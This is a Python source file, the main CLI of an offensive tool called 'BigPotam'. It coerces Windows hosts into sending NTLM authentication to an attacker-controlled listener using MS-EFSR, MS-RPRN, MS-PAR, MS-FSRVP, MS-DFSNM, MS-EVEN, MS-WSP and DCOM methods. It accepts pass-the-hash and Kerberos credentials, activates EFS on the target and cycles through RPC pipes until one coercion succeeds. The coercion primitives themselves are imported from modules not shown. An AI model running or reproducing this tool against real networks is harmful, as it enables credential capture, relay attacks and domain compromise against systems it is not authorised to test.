#!/usr/bin/env python3
"""BigPotam — Unified NTLM authentication coercion tool.

Consolidates MS-EFSR, MS-RPRN, MS-PAR, MS-FSRVP, MS-DFSNM, MS-EVEN,
MS-WSP, and DCOM (UpdateSession) coercion primitives into a single tool.
"""

import argparse
import logging
import sys

from impacket.examples.utils import parse_target

from bigpotam.connection import activate_efs, connect_rpc, connect_smb
from bigpotam.logger import setup_logger, success
from bigpotam.methods.dcom import trigger_update_session
from bigpotam.registry import METHODS
from bigpotam.wsp import trigger_wsp

BANNER = r"""
    __    _         __          __
   / /_  (_)___ _  / /_  ____  / /_____ _____ ___
  / __ \/ / __ `/ / __ \/ __ \/ __/ __ `/ __ `__ \
 / /_/ / / /_/ / / /_/ / /_/ / /_/ /_/ / / / / / /
/_.___/_/\__, / / .___/\____/\__/\__,_/_/ /_/ /_/
        /____/ /_/

  Unified NTLM Coercion Tool — v1.0
"""

PROTOCOLS = [
    "MS-EFSR",
    "MS-RPRN",
    "MS-PAR",
    "MS-FSRVP",
    "MS-DFSNM",
    "MS-EVEN",
    "MS-WSP",
    "DCOM",
]


def parse_args():
    """Parse CLI arguments."""
    parser = argparse.ArgumentParser(
        description="BigPotam — Unified NTLM authentication coercion tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=BANNER,
    )

    parser.add_argument(
        "target",
        help="[[domain/]username[:password]@]<targetName or address>",
    )
    parser.add_argument(
        "listener",
        help="IP or hostname for authentication callback",
    )

    coercion = parser.add_argument_group("coercion options")
    coercion.add_argument(
        "-listener-port",
        type=int,
        default=445,
        dest="listener_port",
        help="Listener port (default: 445, use 80 for WebDAV)",
    )
    coercion.add_argument(
        "-method",
        default=None,
        help="Specific method name (e.g. EfsRpcEncryptFileSrv)",
    )
    coercion.add_argument(
        "-protocol",
        default=None,
        choices=PROTOCOLS,
        help="Limit to one protocol",
    )
    coercion.add_argument(
        "-all",
        action="store_true",
        dest="try_all",
        help="Try all methods even after first success",
    )
    coercion.add_argument(
        "-all-pipes",
        action="store_true",
        dest="all_pipes",
        help="Try all EFSR transports per method (includes tcp_* when -tcp-port is set)",
    )
    coercion.add_argument(
        "-pipe",
        "-efsr-pipe",
        dest="efsr_pipe",
        choices=[
            "lsarpc",
            "efsrpc",
            "samr",
            "lsass",
            "netlogon",
            "tcp_lsarpc",
            "tcp_efsr",
        ],
        default=None,
        help="MS-EFSR pipe/transport override",
    )
    coercion.add_argument(
        "-tcp-port",
        type=int,
        default=None,
        dest="tcp_port",
        help="RPC TCP port for EFSR tcp_* transports",
    )

    auth = parser.add_argument_group("authentication")
    auth.add_argument(
        "-hashes",
        action="store",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes, format is LMHASH:NTHASH",
    )
    auth.add_argument(
        "-no-pass",
        action="store_true",
        dest="no_pass",
        help="Don't ask for password (useful for -k)",
    )
    auth.add_argument(
        "-k",
        action="store_true",
        dest="kerberos",
        help="Use Kerberos authentication",
    )
    auth.add_argument(
        "-dc-ip",
        action="store",
        dest="dc_ip",
        metavar="IP",
        help="IP Address of the domain controller",
    )

    conn = parser.add_argument_group("connection")
    conn.add_argument(
        "-target-ip",
        action="store",
        dest="target_ip",
        metavar="IP",
        help="IP Address of the target machine",
    )
    conn.add_argument(
        "-port",
        type=int,
        default=445,
        choices=[139, 445],
        help="SMB port (default: 445)",
    )
    conn.add_argument(
        "-timeout",
        type=int,
        default=5,
        help="Connection timeout in seconds (default: 5)",
    )

    output = parser.add_argument_group("output")
    output.add_argument(
        "-ts",
        action="store_true",
        help="Add timestamps to output",
    )
    output.add_argument(
        "-debug",
        action="store_true",
        help="Verbose debug output",
    )

    return parser.parse_args()


def _log_result(log, method, pipe_label, ok):
    """Log success or failure for a method attempt."""
    proto, name = method["protocol"], method["name"]
    if pipe_label:
        if ok:
            success(log, "  %s / %s via %s — triggered!", proto, name, pipe_label)
        else:
            log.info("  %s / %s via %s — failed", proto, name, pipe_label)
    elif ok:
        success(log, "  %s / %s — triggered!", proto, name)
    else:
        log.info("  %s / %s — failed", proto, name)


def _try_wsp(method, args, address, target_ip, auth_kw, username):
    """Handle MS-WSP coercion (SMB pipe, not DCE/RPC)."""
    log = logging.getLogger("bigpotam")
    log.info("Trying %s / %s ...", method["protocol"], method["name"])

    smb = connect_smb(
        address,
        target_ip=target_ip,
        port=args.port,
        **auth_kw,
    )
    if smb is None:
        log.info("  Failed to connect via SMB for WSP")
        return False

    listener_uri = f"file:////{args.listener}/share"
    ok = trigger_wsp(smb, listener_uri, username=username)
    _log_result(log, method, None, ok)
    return ok


def _try_dcom(method, args, target_ip, address, auth_kw):
    """Handle DCOM UpdateSession coercion (port 135)."""
    log = logging.getLogger("bigpotam")
    log.info("Trying %s / %s ...", method["protocol"], method["name"])

    ok = trigger_update_session(
        target_ip or address,
        args.listener,
        **auth_kw,
    )
    _log_result(log, method, None, ok)
    return ok


def _try_rpc(method, args, address, target_ip, auth_kw, failed_pipes):
    """Handle standard DCE/RPC coercion methods. Returns True on success."""
    log = logging.getLogger("bigpotam")

    if method["protocol"] == "MS-EFSR" and args.efsr_pipe:
        pipes = [args.efsr_pipe]
    elif args.all_pipes and method["protocol"] == "MS-EFSR":
        pipes = list(method["all_pipes"])
        if args.tcp_port:
            pipes.extend(method.get("tcp_pipes", []))
    elif "default_pipes" in method:
        pipes = method["default_pipes"]
    else:
        pipes = [method["pipe"]]

    use_epm = method["connection_type"] == "rpc_epm"

    for pipe in pipes:
        pipe_key = (method["protocol"], pipe)

        if pipe_key in failed_pipes:
            log.debug(
                "Skipping %s (pipe %s previously failed)",
                method["name"],
                pipe,
            )
            continue

        uuid = method["uuid_by_pipe"].get(pipe, method["uuid"])
        pipe_label = "[dcerpc]" if use_epm else pipe

        log.info(
            "Trying %s / %s via %s ...",
            method["protocol"],
            method["name"],
            pipe_label,
        )

        dce = connect_rpc(
            address,
            pipe,
            uuid,
            target_ip=target_ip,
            port=args.port,
            tcp_port=args.tcp_port,
            use_epm=use_epm,
            **auth_kw,
        )
        if dce is None:
            failed_pipes.add(pipe_key)
            continue

        ok = method["trigger"](
            dce,
            args.listener,
            listener_port=args.listener_port,
            target=address,
        )

        try:
            dce.disconnect()
        except Exception:
            pass

        _log_result(log, method, pipe_label, ok)
        if ok:
            return True

    return False


def run(args):
    """Execute coercion methods against the target."""
    log = logging.getLogger("bigpotam")

    if args.efsr_pipe and not args.efsr_pipe.startswith("tcp_") and args.tcp_port:
        log.debug("Ignoring -tcp-port because %s is not a tcp_* transport", args.efsr_pipe)

    if args.efsr_pipe and args.efsr_pipe.startswith("tcp_") and not args.tcp_port:
        log.error("MS-EFSR tcp_* transports require -tcp-port")
        return 1

    domain, username, password, address = parse_target(args.target)
    domain = domain or ""
    target_ip = args.target_ip or address

    if password == "" and username != "" and args.hashes is None and not args.no_pass:
        from getpass import getpass

        password = getpass("Password:")

    lmhash, nthash = "", ""
    if args.hashes:
        lmhash, nthash = args.hashes.split(":")

    log.info("Target: %s (%s)", address, target_ip)
    log.info("Listener: %s:%d", args.listener, args.listener_port)

    auth_kw = {
        "username": username,
        "password": password,
        "domain": domain,
        "lmhash": lmhash,
        "nthash": nthash,
        "do_kerberos": args.kerberos,
        "dc_host": args.dc_ip,
        "timeout": args.timeout,
    }

    efs_activated = False
    successes = []
    failed_pipes: set[tuple[str, str]] = set()

    for method in METHODS:
        if args.method and args.method.lower() != method["name"].lower():
            continue
        if args.protocol and args.protocol != method["protocol"]:
            continue

        conn_type = method["connection_type"]
        ok = False

        if conn_type == "wsp":
            ok = _try_wsp(
                method,
                args,
                address,
                target_ip,
                auth_kw,
                username,
            )
        elif conn_type == "dcom":
            ok = _try_dcom(method, args, target_ip, address, auth_kw)
        else:
            # EFS activation (once per target)
            if method.get("requires_efs_activation") and not efs_activated:
                log.info("Activating EFS service...")
                activation_kw = dict(auth_kw)
                activation_kw["timeout"] = min(args.timeout, 2)
                activate_efs(
                    address,
                    target_ip=target_ip,
                    port=args.port,
                    **activation_kw,
                )
                efs_activated = True

            ok = _try_rpc(
                method,
                args,
                address,
                target_ip,
                auth_kw,
                failed_pipes,
            )

        if ok:
            successes.append(method)
            if not args.try_all:
                break

    # Summary
    print()
    if successes:
        success(
            log,
            "Coercion succeeded with %d method(s):",
            len(successes),
        )
        for m in successes:
            success(log, "  %s / %s", m["protocol"], m["name"])
    else:
        log.error("All coercion methods failed against %s", address)

    return 0 if successes else 1


def main():
    """CLI entry point."""
    args = parse_args()
    print(BANNER)
    setup_logger(timestamps=args.ts, debug=args.debug)
    sys.exit(run(args))


if __name__ == "__main__":
    main()
